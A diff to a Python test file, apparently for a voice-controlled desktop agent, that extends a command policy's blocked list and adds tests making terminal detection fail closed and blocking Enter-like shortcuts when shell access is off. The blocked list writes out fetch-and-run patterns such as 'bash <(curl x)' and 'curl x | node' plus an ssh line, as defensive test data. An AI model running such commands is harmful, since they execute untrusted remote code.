@@ -26,6 +26,8 @@ class PolicyTests(unittest.TestCase):
             'omarchy theme set catppuccin',
             'omarchy audio output volume +5',
             'launch chromium',
+            'python3 my-file.py',
+            'python3 app-service.py',
         ]:
             with self.subTest(action=action):
                 self.policy.check(action)  # must not raise
@@ -56,6 +58,9 @@ class PolicyTests(unittest.TestCase):
             "bash <(curl x)",
             "eval \"$(curl x)\"",
             "curl x -o y; sh y",
+            "sh y",
+            "bash y",
+            "python3 /tmp/y.py",
             "curl x | node",
             "xxd -r p | sh",
             "ssh someone@elsewhere",
@@ -205,6 +210,46 @@ class ExecutorTests(unittest.TestCase):
             with mock.patch("omarchy_voice.tools.shutil.which", return_value="/usr/bin/wtype"):
                 executor.call("type_text", {"text": "-something"})
         shell.assert_called_once_with(["wtype", "--", "-something"])
+
+    def test_terminal_detection_ignores_substring_matches_like_steam(self):
+        executor = Executor(Config(allow_shell=False))
+        with mock.patch.object(executor, "_window_geometry", return_value=({"class": "steam"}, None)):
+            self.assertFalse(executor._is_terminal_window())
+        with mock.patch.object(executor, "_window_geometry", return_value=({"class": "postman"}, None)):
+            self.assertFalse(executor._is_terminal_window())
+        for cls in ("st", "st-256color", "kitty", "alacritty", "footclient", "org.gnome.Terminal", "com.mitchellh.ghostty"):
+            with mock.patch.object(executor, "_window_geometry", return_value=({"class": cls}, None)):
+                self.assertTrue(executor._is_terminal_window(), f"Failed to detect terminal: {cls}")
+
+    def test_terminal_detection_fails_closed_when_window_lookup_fails(self):
+        executor = Executor(Config(allow_shell=False))
+        with mock.patch.object(executor, "_window_geometry", return_value=(None, None)):
+            self.assertTrue(executor._is_terminal_window())
+        with mock.patch.object(executor, "_window_geometry", side_effect=RuntimeError("hyprctl error")):
+            self.assertTrue(executor._is_terminal_window())
+
+    def test_terminal_ctrl_j_and_ctrl_m_shortcuts_blocked_when_allow_shell_false(self):
+        executor = Executor(Config(allow_shell=False))
+        with mock.patch.object(executor, "_is_terminal_window", return_value=True):
+            res_j = executor.call("send_shortcut", {"mods": "ctrl", "key": "j"})
+            self.assertFalse(res_j.ok)
+            self.assertIn("disabled when allow_shell = false", res_j.output)
+
+            res_m = executor.call("send_shortcut", {"mods": "ctrl", "key": "m"})
+            self.assertFalse(res_m.ok)
+            self.assertIn("disabled when allow_shell = false", res_m.output)
+
+            res_disp = executor.call("hypr_dispatch", {
+                "lua": 'hl.dsp.send_shortcut({ mods = "ctrl", key = "j" })'
+            })
+            self.assertFalse(res_disp.ok)
+            self.assertIn("disabled when allow_shell = false", res_disp.output)
+
+            res_disp_ret = executor.call("hypr_dispatch", {
+                "lua": 'hl.dsp.send_shortcut({ mods = "", key = "Return" })'
+            })
+            self.assertFalse(res_disp_ret.ok)
+            self.assertIn("disabled when allow_shell = false", res_disp_ret.output)
 
 
 if __name__ == "__main__":
